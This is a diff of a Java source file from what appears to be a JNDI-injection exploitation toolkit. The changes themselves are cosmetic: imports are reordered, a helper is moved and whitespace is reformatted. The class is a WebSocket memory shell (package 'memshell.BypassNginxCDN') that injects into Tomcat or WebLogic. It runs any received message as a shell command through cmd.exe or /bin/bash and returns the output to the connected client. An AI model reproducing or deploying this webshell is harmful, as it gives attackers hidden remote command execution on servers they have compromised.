@@ -1,31 +1,28 @@
 package com.qi4l.jndi.template.memshell.BypassNginxCDN;
 
-import java.lang.reflect.Field;
-import java.util.*;
-import java.io.InputStream;
-import javax.servlet.ServletContext;
-import javax.websocket.server.ServerContainer;
-import javax.websocket.server.ServerEndpointConfig;
-
-import org.apache.tomcat.websocket.server.WsServerContainer;
-import org.apache.tomcat.websocket.Constants;
-
-import javax.websocket.*;
-
-import org.apache.tomcat.websocket.server.WsHandshakeRequest;
-import org.apache.tomcat.websocket.WsHandshakeResponse;
-
-import java.nio.charset.StandardCharsets;
-
 import org.apache.tomcat.util.codec.binary.Base64;
 import org.apache.tomcat.util.security.ConcurrentMessageDigest;
-import org.apache.tomcat.websocket.server.WsHttpUpgradeHandler;
+import org.apache.tomcat.websocket.Constants;
 import org.apache.tomcat.websocket.Transformation;
-import org.apache.catalina.connector.RequestFacade;
+import org.apache.tomcat.websocket.WsHandshakeResponse;
+import org.apache.tomcat.websocket.server.WsHandshakeRequest;
+import org.apache.tomcat.websocket.server.WsHttpUpgradeHandler;
+import org.apache.tomcat.websocket.server.WsServerContainer;
 import weblogic.servlet.internal.HttpConnectionHandler;
 import weblogic.servlet.internal.ServletRequestImpl;
 import weblogic.servlet.internal.ServletResponseImpl;
 import weblogic.servlet.provider.ContainerSupportProviderImpl;
+
+import javax.servlet.ServletContext;
+import javax.websocket.*;
+import javax.websocket.server.ServerContainer;
+import javax.websocket.server.ServerEndpointConfig;
+import java.io.InputStream;
+import java.lang.reflect.Field;
+import java.nio.charset.StandardCharsets;
+import java.util.Collections;
+import java.util.List;
+import java.util.Map;
 
 public class cmsMSBYNC extends Endpoint implements MessageHandler.Whole<String> {
 
@@ -66,7 +63,15 @@ public class cmsMSBYNC extends Endpoint implements MessageHandler.Whole<String> 
         } catch (Exception ignored) {
         }
     }
+
     private Session session;
+
+    private static String getWebSocketAccept(String key) {
+        byte[] WS_ACCEPT = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11".getBytes(StandardCharsets.ISO_8859_1);
+        byte[] digest    = ConcurrentMessageDigest.digestSHA1(key.getBytes(StandardCharsets.ISO_8859_1), WS_ACCEPT);
+        return Base64.encodeBase64String(digest);
+    }
+
     @Override
     public void onOpen(Session session, EndpointConfig endpointConfig) {
         this.session = session;
@@ -79,26 +84,20 @@ public class cmsMSBYNC extends Endpoint implements MessageHandler.Whole<String> 
             Process process;
             boolean bool = System.getProperty("os.name").toLowerCase().startsWith("windows");
             if (bool) {
-                process = Runtime.getRuntime().exec(new String[] { "cmd.exe", "/c", s });
+                process = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", s});
             } else {
-                process = Runtime.getRuntime().exec(new String[] { "/bin/bash", "-c", s });
+                process = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", s});
             }
-            InputStream inputStream = process.getInputStream();
+            InputStream   inputStream   = process.getInputStream();
             StringBuilder stringBuilder = new StringBuilder();
-            int i;
+            int           i;
             while ((i = inputStream.read()) != -1)
-                stringBuilder.append((char)i);
+                stringBuilder.append((char) i);
             inputStream.close();
             process.waitFor();
             session.getBasicRemote().sendText(stringBuilder.toString());
         } catch (Exception exception) {
             exception.printStackTrace();
         }
-    }
-
-    private static String getWebSocketAccept(String key) {
-        byte[] WS_ACCEPT = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11".getBytes(StandardCharsets.ISO_8859_1);
-        byte[] digest = ConcurrentMessageDigest.digestSHA1(key.getBytes(StandardCharsets.ISO_8859_1), WS_ACCEPT);
-        return Base64.encodeBase64String(digest);
     }
 }
